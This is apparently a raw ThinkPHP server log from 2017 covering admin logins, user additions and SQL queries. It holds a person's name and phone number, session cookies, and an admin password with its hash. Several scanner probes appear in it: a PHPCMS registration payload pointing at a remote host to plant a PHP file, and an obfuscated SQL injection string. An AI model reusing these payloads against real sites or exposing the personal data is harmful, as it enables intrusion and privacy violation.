+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000730s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000472s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000491s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000537s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000161s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:22:46+08:00 ] 118.190.138.146 140.207.185.112 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.014718s][吞吐率：67.94req/s] [内存消耗：1,741.37kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate, sdch, br',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T10:23:15+08:00 ] 118.190.138.146 112.224.21.194 POST /index.php/admin/vote/ajax_user_add.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/ajax_user_add.html [运行时间：0.031132s][吞吐率：32.12req/s] [内存消耗：3,213.02kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'ajax_user_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'content-length' => '133',
+  'accept' => '*/*',
+  'origin' => 'http://tez.lyzfrj.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_add.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+)
+[ info ] [ PARAM ] array (
+  'name' => '张娟娟',
+  'mobile' => '13791588033',
+  'card' => '',
+  'number' => '3',
+  'buy_time' => '2017-09-24',
+  'work_unit' => '信程旅游',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->ajax_user_add[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000369s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000747s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000210s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000461s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000466s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000520s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000505s ]
+[ sql ] [ SQL ] INSERT INTO `zifi_user` (`name` , `mobile` , `card` , `number` , `buy_time` , `work_unit` , `status` , `add_time` , `update_time`) VALUES ('张娟娟' , '13791588033' , '' , 3 , '2017-09-24' , '信程旅游' , 1 , 1506219795 , 1506219795) [ RunTime:0.000265s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:23:16+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/vote/user_add.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_add.html [运行时间：0.031015s][吞吐率：32.24req/s] [内存消耗：3,275.37kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_add.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_add[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_add.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000363s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000740s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000482s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000558s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000164s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:24:11+08:00 ] 118.190.138.146 112.224.21.194 GET /index.php/admin/vote/user_list.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_list.html [运行时间：0.034255s][吞吐率：29.19req/s] [内存消耗：3,437.80kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+  'x-requested-with' => 'com.android.browser',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_list[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_list.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'list_data',
+  5 => 'keyword',
+  6 => 'ip',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000438s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000758s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000457s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000476s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000160s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000508s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000176s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000518s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000189s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` ORDER BY add_time desc LIMIT 0,50 [ RunTime:0.000260s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000171s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T10:24:30+08:00 ] 118.190.138.146 112.224.21.194 POST /index.php/admin/vote/user_send.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_send.html [运行时间：0.281857s][吞吐率：3.55req/s] [内存消耗：3,312.27kb] [文件加载：47]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_send',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'keep-alive',
+  'content-length' => '5',
+  'accept' => '*/*',
+  'origin' => 'http://tez.lyzfrj.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0;zh_cn; Letv X500 Build/DBXCNOP5902605181S) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/49.0.2623.91 Mobile Safari/537.36 EUI Browser/1.3.2.39',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_list.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'PHPSESSID=47q49sml0e5gprvit1vt0d7bn0',
+)
+[ info ] [ PARAM ] array (
+  'id' => '94',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_send[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000391s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000750s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=3 ) LIMIT 1 [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000492s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=1 ) LIMIT 1 [ RunTime:0.000138s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000164s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,71,51,11,12,13,14) ) ORDER BY sort desc [ RunTime:0.000181s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000215s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000559s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` WHERE  `id` = 94 LIMIT 1 [ RunTime:0.000260s ]
+[ sql ] [ SQL ] UPDATE `zifi_user`  SET `status`=2  WHERE  `id` = 94 [ RunTime:0.000395s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T11:27:55+08:00 ] 118.190.138.146 140.205.225.191 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.014581s][吞吐率：68.58req/s] [内存消耗：1,744.33kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'content-length' => '171',
+  'host' => 'tez.lyzfrj.com:80',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'AmhXFLGH',
+  'password' => 'AmhXFLGH',
+  'email' => 'AmhXFLGH@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T11:27:57+08:00 ] 118.190.138.146 140.205.225.191 GET /index.php?m=wap&a=index&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.014641s][吞吐率：68.30req/s] [内存消耗：1,741.60kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T11:27:57+08:00 ] 118.190.138.146 140.205.225.191 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] tez.lyzfrj.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.014632s][吞吐率：68.34req/s] [内存消耗：1,742.65kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T11:27:57+08:00 ] 118.190.138.146 140.205.225.191 GET /index.php?m=content&c=down&a_k=
+[ log ] tez.lyzfrj.com:80/index.php?m=content&c=down&a_k= [运行时间：0.014567s][吞吐率：68.65req/s] [内存消耗：1,742.05kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T14:53:49+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.014755s][吞吐率：67.77req/s] [内存消耗：1,741.53kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T14:53:49+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/login/login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/login.html [运行时间：0.015506s][吞吐率：64.49req/s] [内存消耗：1,713.21kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/login/login.html [ array (
+  0 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T14:53:49+08:00 ] 118.190.138.146 39.90.165.207 GET /index.php/admin/common/verify.html
+[ log ] tez.lyzfrj.com/index.php/admin/common/verify.html [运行时间：0.013326s][吞吐率：75.04req/s] [内存消耗：1,460.63kb] [文件加载：28]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'common',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'image/png, image/svg+xml, image/jxr, image/*;q=0.8, */*;q=0.5',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Common->verify[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Common.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T14:54:02+08:00 ] 118.190.138.146 39.90.165.207 POST /index.php/admin/login/do_login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/do_login.html [运行时间：0.029896s][吞吐率：33.45req/s] [内存消耗：2,683.43kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'do_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => '*/*',
+  'x-requested-with' => 'XMLHttpRequest',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'host' => 'tez.lyzfrj.com',
+  'content-length' => '39',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'cookie' => 'PHPSESSID=k709fjm87v3otdmka4gfun0d65',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'user',
+  'password' => '123456',
+  'code' => '5664',
+)
+[ info ] [ RUN ] app\admin\controller\Login->do_login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000369s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000803s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'user' LIMIT 1 [ RunTime:0.000356s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'user'  AND `password` = 'e10adc3949ba59abbe56e057f20f883e' LIMIT 1 [ RunTime:0.000257s ]
